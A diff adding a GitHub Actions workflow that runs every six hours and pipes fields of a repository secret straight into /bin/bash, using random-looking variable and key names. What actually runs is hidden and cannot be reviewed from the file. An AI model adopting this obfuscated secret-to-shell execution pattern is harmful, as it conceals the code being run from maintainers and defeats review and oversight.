@@ -1,0 +1,27 @@
+name: nianxingguiwu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: nianxingguiwu
+        env:
+          fi843: ${{ secrets.fi843 }}
+        run: |
+          echo $fi843 | jq -r .e56471 | /bin/bash
+          echo $fcwx297 | jq -r .n53 | /bin/bash
+          echo $rf162 | jq -r .j6800 | /bin/bash
+          echo $b0534 | jq -r .qlb939 | /bin/bash
+          echo $jgtb790 | jq -r .ahcje4 | /bin/bash
+          echo $scznb24295 | jq -r .l36 | /bin/bash
+          echo $io5 | jq -r .jeyla9780 | /bin/bash
+          echo $nxdgl7293 | jq -r .kzm68 | /bin/bash
+          echo $bgm20 | jq -r .wfpek20729 | /bin/bash
+          echo $ef2 | jq -r .bcncm3863 | /bin/bash
+
